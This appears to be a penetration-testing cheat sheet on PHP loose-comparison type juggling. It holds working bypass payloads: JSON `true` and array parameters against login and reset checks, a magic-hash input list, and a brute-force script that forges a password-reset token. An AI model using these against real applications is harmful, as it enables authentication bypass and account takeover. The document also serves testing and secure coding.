**PHP type juggling and magic hashes** — PHP's loose comparison (`==`, `!=`, `in_array`, `switch`) converts both sides before comparing, so values of different types, or two different numeric-looking strings, can compare equal. Mechanically: you find a security check that uses a loose comparison against a secret (token, hash, password), then send a value of a type or shape that PHP converts into "equal" without knowing the secret. A magic hash is the special case where a hash that looks like `0e` followed by digits is read as the number zero.

```
check:  if ($_POST['token'] == $expected)       loose
you  -> JSON {"token": true}                    true == "any non-empty string"
you  -> token=0                                  "0" == "0e462097431906509019562988736854"
app  -> "equal", you are in
```

Every row below was run on PHP 7.4.33 and PHP 8.3.36.

## How it works

Three rules do the damage:

1. **Number against string:** before PHP 8 the string is converted to a number, and a string that does not start with a digit becomes `0`. PHP 8 compares as strings unless the string is numeric.
2. **Numeric string against numeric string:** both are compared as numbers, on every version. `"1e3"` is 1000, and `"0e…"` is zero whatever follows the `e`.
3. **Boolean against anything:** the other side is converted to boolean, on every version. Any non-empty string except `"0"` is `true`.

| Comparison | PHP 7.4 | PHP 8.3 |
|---|---|---|
| `0 == "abc"` | true | **false** |
| `0 == ""` | true | **false** |
| `"1abc" == 1` | true | **false** |
| `"abc" == true` | true | true |
| `null == false`, `null == 0`, `null == ""` | true | true |
| `"0" == false`, `[] == false` | true | true |
| `"1" == "01"`, `"10" == "1e1"`, `"100" == "1e2"` | true | true |
| `"0e1" == "0e2"`, `"0e1" == "0"`, `"0e1" == 0` | true | true |
| `"1" == " 1"` | true | true |
| `"1" == "1 "` | false | **true** |
| `"0x1A" == 26` | false | false |

So PHP 8 killed rule 1 and nothing else. Magic hashes and the boolean trick still work.

## Discovery

White-box, grep the comparison next to anything secret:

```bash
grep -rnE '(==|!=)[^=]' --include='*.php' . | grep -iE 'hash|token|pass|secret|key|sig|hmac|code|otp'
grep -rnE 'strcmp\(|strcasecmp\(|in_array\(|array_search\(|switch *\(' --include='*.php' .
grep -rnE 'md5\(|sha1\(|hash\(' --include='*.php' . | grep -E '(==|!=)[^=]'
```

Then answer three questions for each hit:

- Is it `==` or `===`? `hash_equals()` and `===` are safe. `!strcmp()` is not.
- Can you control the **type** of your side? JSON bodies, `unserialize`, and `param[]=` array syntax all give you non-strings.
- Does your side, or the hashed input, contain something you control? That decides whether a magic hash is reachable.

Check the version early (`X-Powered-By`, `phpinfo`, `composer.json`), because it decides which rows of the table apply.

Black-box: change the type and watch for a different answer. Send the token as `0`, as JSON `true`, as `token[]=`.

## Exploitation

### Method 1: send a boolean or a number in JSON

Works when the app reads the body with `json_decode` and compares loosely.

```
POST /api/reset HTTP/1.1
Content-Type: application/json

{"email":"admin@victim.example","token":true}
```

| Your JSON value | Compared with | PHP 7.4 | PHP 8.3 |
|---|---|---|---|
| `true` | any non-empty secret string | true | true |
| `0` | a secret that does not start with a digit | true | **false** |
| `0` | a secret that looks like `0e…` | true | true |
| `null` | an empty or unset secret | true | true |
| `[]` | a secret string | false | false |

`true` is the one to try first, on any version.

### Method 2: arrays into string functions

`param[]=x` makes `$_POST['param']` an array.

| Call | PHP 7.4 | PHP 8.3 |
|---|---|---|
| `strcmp([], "secret")` | `NULL` with a warning, so `== 0` and `!strcmp()` pass | `TypeError` |
| `md5([])`, `sha1([])` | `NULL`, so `md5($a) == md5($b)` and even `===` pass for two arrays | `TypeError` |
| `strlen([])` | `NULL` | `TypeError` |
| `preg_match('/…/', [])` | `false` | `TypeError` |

```
POST /login
user=admin&password[]=x
```

On PHP 8 these become a 500 instead of a bypass. An uncaught `TypeError` still tells you the code path is loose.

### Method 3: loose membership and switch

| Code | PHP 7.4 | PHP 8.3 |
|---|---|---|
| `in_array("abc", [0])`, `in_array(0, ["abc"])` | true | false |
| `in_array("1e1", ["10"])` | true | true |
| `array_search("x", [0])` | `0` (found) | `false` |
| `switch ("abc") { case 0: … }` | takes `case 0` | default |

A role or ID allow-list checked with `in_array($id, $allowed)` and no third argument is the usual place.

### Method 4: magic hashes

Two strings that both look like `0e<digits>` are both zero, so they are equal. Known inputs:

| Algorithm | Input | Hash |
|---|---|---|
| md5 | `240610708` | `0e462097431906509019562988736854` |
| md5 | `QNKCDZO` | `0e830400451993494058024219903391` |
| md5 | `aabg7XSs` | `0e087386482136013740957780965295` |
| md5 | `QLTHNDT` | `0e405967825401955372549139051580` |
| md5 | `0e215962017` | `0e291242476940776845150308577824` (hash of itself is also magic) |
| sha1 | `10932435112` | `0e07766915004133176347055865026311692244` |
| sha1 | `aaroZmOk` | `0e66507019969427134894567494305185566735` |
| sha1 | `aaK1STfY` | `0e76658526655756207688271159624026011393` |

Where they pay:

- **Password check `md5($input) == $stored`** when the stored hash is itself magic. Rare, but it happens with imported or seeded accounts.
- **`md5($x) == $x`** checks: `0e215962017`.
- **A token the app computes from data you influence**, compared with `==` against what you send. Make the computed hash magic, then send `0`. This is the common white-box finding; the public example is the e-mail confirmation link in ATutor 2.2.1.

### Method 5: make the computed hash magic

When the app hashes something like `email . date . id` and compares the first characters to your parameter, brute force the part you control until the result is `0e` plus digits:

```php
<?php
$known = '2026-11-19' . '42';                    // the parts of the hashed string you do not control
for ($i = 0; ; $i++) {
    $email = "a$i@attacker.example";             // the part you do control
    $h = substr(md5($email . $known), 0, 10);    // mirror the target's formula exactly
    if (preg_match('/^0+e\d+$/', $h)) { echo "$email  $h  tries=$i\n"; break; }
}
```

That found `a7481@attacker.example` with hash prefix `0e40669610` after 7,481 tries. Register or set that address, then request the link with the token set to `0`: `"0e40669610" == "0"` is true on both versions.

Cost grows with the length compared. A 10-character prefix needs about ten thousand tries on average, a full 32-character md5 about 340 million (minutes in a compiled loop, longer in PHP).

## Caution

- **PHP 8.0 is the boundary** for number-against-string and for arrays passed to string functions. Magic hashes, numeric strings and the boolean comparison are unchanged in 8.3.
- **Trailing whitespace** became numeric in PHP 8 (`"1" == "1 "`, `is_numeric("1 ")`), so that particular filter is weaker on new versions, not stronger.
- **`0e` needs digits only after the `e`.** One letter in the rest and the string is not numeric, so the comparison falls back to plain string equality.
- **Hex is not numeric:** `"0x1A" == 26` is false on both versions.
- **bcrypt, argon2 and `password_verify()` are not affected.** This is about raw `md5`/`sha1`/`hash` output compared with `==`.

## References

- PHP manual - Comparison operators (the loose comparison tables) - https://www.php.net/manual/en/language.operators.comparison.php
- PHP RFC - Saner string to number comparisons (the PHP 8 change) - https://wiki.php.net/rfc/string_to_number_comparison
- PayloadsAllTheThings - Type juggling - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling
- spaze - Magic hashes list - https://github.com/spaze/hashes
